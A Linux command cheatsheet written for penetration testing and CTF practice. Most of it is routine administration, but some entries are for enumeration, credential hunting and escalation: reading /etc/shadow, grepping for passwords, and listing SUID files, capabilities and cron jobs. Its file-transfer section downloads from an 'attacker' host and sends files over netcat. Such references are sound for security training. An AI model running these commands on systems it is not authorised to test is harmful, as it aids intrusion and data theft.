# Linux Commands Cheatsheet

A reference for Linux commands commonly used in penetration testing and CTFs.

---

## Navigation & File Management

```bash
pwd                                   # Print working directory
ls -la                                # List all files with permissions
cd /path/to/dir                       # Change directory
cd -                                  # Go back to previous directory
find / -name "*.conf" 2>/dev/null     # Find files by name
find / -perm -4000 2>/dev/null        # Find SUID files
find / -writable -type f 2>/dev/null  # Find writable files
locate filename                       # Fast file search (uses database)
which binary                          # Find binary path
whereis binary                        # Find binary + man page

cp file dest                          # Copy file
mv file dest                          # Move/rename file
rm -rf dir                            # Recursively remove directory
mkdir -p path/to/dir                  # Create nested directories
ln -s target linkname                 # Create symbolic link
```

---

## File Content

```bash
cat file                # Display file content
less file               # Paginate through file
head -n 20 file         # First 20 lines
tail -n 20 file         # Last 20 lines
tail -f file            # Follow file (live updates — great for logs)
grep "pattern" file     # Search for pattern
grep -r "pattern" dir/  # Recursive search
grep -i "pattern" file  # Case-insensitive
grep -v "pattern" file  # Invert match (exclude)
grep -n "pattern" file  # Show line numbers
strings file            # Extract printable strings from binary
xxd file                # Hex dump
od -A x -t x1z file     # Hex dump (alternate)
```

---

## Permissions

```bash
# Permission format: [type][owner][group][other]
# r=4, w=2, x=1

chmod 755 file         # rwxr-xr-x
chmod +x script.sh     # Add execute bit
chmod u+s file         # Set SUID bit
chmod g+s file         # Set SGID bit
chown user:group file  # Change owner/group
chown -R user dir/     # Recursive chown

# View permissions
ls -la file
stat file
```

---

## Processes

```bash
ps aux                 # All processes (BSD style)
ps -ef                 # All processes (UNIX style)
pgrep processname      # Find PID by name
kill -9 PID            # Force kill process
killall processname    # Kill all by name
top                    # Interactive process viewer
htop                   # Better top (if installed)
nice -n 10 command     # Run with lower priority
nohup command &        # Run in background, survive logout
jobs                   # List background jobs
fg %1                  # Bring job 1 to foreground
bg %1                  # Send job 1 to background

# Check what a process is doing
strace -p PID          # Trace syscalls
lsof -p PID            # Files open by process
```

---

## Networking

```bash
# Interfaces and addresses
ip a                   # Show interfaces and IPs
ip link                # Show interfaces
ifconfig               # Old-style interface info

# Routing
ip route               # Show routing table
route -n               # Show routing table (old)
ip route add 192.168.2.0/24 via 192.168.1.1   # Add route

# Connections
ss -tan                # TCP connections (no DNS)
ss -tuln               # Listening ports
ss -tp                 # With process info
netstat -an            # All connections (old)
netstat -tulnp         # Listening + process

# DNS
dig example.com         # DNS lookup
dig +short example.com  # Short answer
nslookup example.com    # Basic lookup
host example.com        # Simple lookup

# Connectivity
ping -c 4 target       # ICMP ping (4 packets)
traceroute target      # Trace route
curl http://target     # HTTP request
curl -I http://target  # HTTP headers only
wget http://target/file # Download file

# Packet capture
tcpdump -i eth0                       # Capture on interface
tcpdump -i eth0 port 80              # Filter by port
tcpdump -i eth0 host 192.168.1.1    # Filter by host
tcpdump -w capture.pcap             # Write to file
tcpdump -r capture.pcap             # Read from file
```

---

## Users and Groups

```bash
id                     # Current user and groups
whoami                 # Username
groups                 # Groups current user is in
cat /etc/passwd        # All users
cat /etc/shadow        # Password hashes (requires root)
cat /etc/group         # All groups
last                   # Login history
lastlog                # Last login for all users
w                      # Logged in users + activity

# Switching users
su username            # Switch user (needs their password)
su -                   # Switch to root
sudo -l                # What can current user run as sudo?
sudo -u username cmd   # Run command as another user

# Adding users (root)
useradd -m username              # Create user with home
passwd username                  # Set password
usermod -aG sudo username        # Add to sudo group
```

---

## File Archiving and Compression

```bash
# tar
tar -cvf archive.tar dir/        # Create tar
tar -xvf archive.tar             # Extract tar
tar -czvf archive.tar.gz dir/   # Create gzip tar
tar -xzvf archive.tar.gz        # Extract gzip tar
tar -cjvf archive.tar.bz2 dir/  # Create bzip2 tar
tar -xjvf archive.tar.bz2       # Extract bzip2 tar
tar -tf archive.tar              # List contents

# zip
zip -r archive.zip dir/         # Create zip
unzip archive.zip                # Extract zip
unzip -l archive.zip             # List contents

# gzip
gzip file                        # Compress (replaces file)
gunzip file.gz                   # Decompress
gzip -d file.gz                  # Decompress (same as gunzip)
```

---

## Searching and Filtering

```bash
grep "pattern" file              # Basic search
grep -r "password" /var/www/     # Recursive search
grep -rl "pattern" dir/          # List matching files only
grep -A 3 "pattern" file         # 3 lines after match
grep -B 3 "pattern" file         # 3 lines before match
grep -C 3 "pattern" file         # 3 lines context

# Find files containing pattern
find / -type f -exec grep -l "pattern" {} \; 2>/dev/null

# Cut, sort, uniq
cut -d: -f1 /etc/passwd          # Extract first field (colon-delimited)
sort file                        # Sort alphabetically
sort -n file                     # Sort numerically
sort -u file                     # Sort and remove duplicates
uniq file                        # Remove consecutive duplicates
uniq -c file                     # Count duplicates

# awk
awk -F: '{print $1}' /etc/passwd  # Print first field
awk '{print NR": "$0}' file       # Number lines
awk 'NR>5' file                   # Skip first 5 lines
awk '/pattern/ {print $2}' file   # Print field 2 of matching lines

# sed
sed 's/old/new/g' file           # Replace all occurrences
sed -n '5,10p' file              # Print lines 5-10
sed '/pattern/d' file            # Delete matching lines
```

---

## Environment and Shell

```bash
env                              # Print all env variables
export VAR=value                 # Set env variable
echo $VAR                        # Print variable
echo $PATH                       # Print PATH
export PATH=$PATH:/new/path      # Add to PATH

history                          # Command history
history | grep ssh               # Search history
!!                               # Repeat last command
!n                               # Repeat command number n
Ctrl+R                           # Reverse search history

alias ll='ls -la'               # Create alias
source ~/.bashrc                # Reload shell config
```

---

## Transferring Files

```bash
# SCP (SSH file copy)
scp file user@host:/remote/path         # Local → Remote
scp user@host:/remote/file local/path   # Remote → Local
scp -r dir/ user@host:/remote/          # Recursive

# Wget / Curl
wget http://attacker/file -O /tmp/file
curl http://attacker/file -o /tmp/file
curl -O http://attacker/file             # Save with original filename

# Python HTTP server (on attacker to serve files)
python3 -m http.server 8080
python -m SimpleHTTPServer 8080          # Python 2

# Netcat file transfer
# Receiver:
nc -lvnp 4444 > received_file
# Sender:
nc target_ip 4444 < file_to_send

# Base64 (for restricted environments)
base64 file > encoded.txt                # Encode on source
base64 -d encoded.txt > file             # Decode on target
```

---

## Privilege Checking

```bash
id && whoami                     # Who am I
sudo -l                          # Sudo permissions
cat /etc/sudoers 2>/dev/null     # Sudoers file
find / -perm -4000 2>/dev/null   # SUID files
find / -perm -2000 2>/dev/null   # SGID files
getcap -r / 2>/dev/null          # Files with capabilities
cat /etc/crontab                 # Cron jobs
ls /etc/cron.d/                  # Additional cron jobs
crontab -l                       # Current user's crontab
```

---

## System Information

```bash
uname -a                         # Kernel version + arch
cat /etc/os-release              # OS information
hostname                         # System hostname
uptime                           # Uptime + load average
df -h                            # Disk usage (human readable)
du -sh dir/                      # Directory size
free -h                          # Memory usage
lscpu                            # CPU information
lsblk                            # Block devices
mount                            # Mounted filesystems
```

---

## Useful One-Liners

```bash
# Find config files with credentials
grep -rn "password" /etc/ 2>/dev/null

# Check for listening services not shown by ss
cat /proc/net/tcp | awk 'NR>1{split($2, a, ":"); printf "%d\n", strtonum("0x"a[2])}'

# Readable SUID/SGID files
find / -perm /6000 -readable 2>/dev/null

# Find recently modified files
find / -newer /tmp -type f 2>/dev/null | head -20

# Find world-writable files
find / -perm -o+w -type f 2>/dev/null | grep -v /proc

# Monitor new processes (poor man's pspy)
while true; do ps aux; sleep 1; done | grep -v "ps aux" | sort -u

# Get external IP
curl ifconfig.me
curl icanhazip.com
```

---

## References

- [ExplainShell.com](https://explainshell.com/) — explain any command
- [TLDR Pages](https://tldr.sh/) — simplified man pages
- [Linux Command Library](https://linuxcommandlibrary.com/)
